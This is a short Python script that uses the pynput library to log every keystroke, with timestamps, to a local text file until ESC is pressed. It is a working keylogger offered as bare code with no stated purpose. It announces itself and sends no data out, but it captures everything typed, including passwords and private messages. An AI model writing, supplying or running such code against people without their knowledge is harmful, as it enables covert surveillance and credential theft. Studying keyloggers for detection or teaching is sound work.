from pynput import keyboard
import datetime

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - Special key pressed: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Logging started. Press ESC to stop.")
    listener.join()
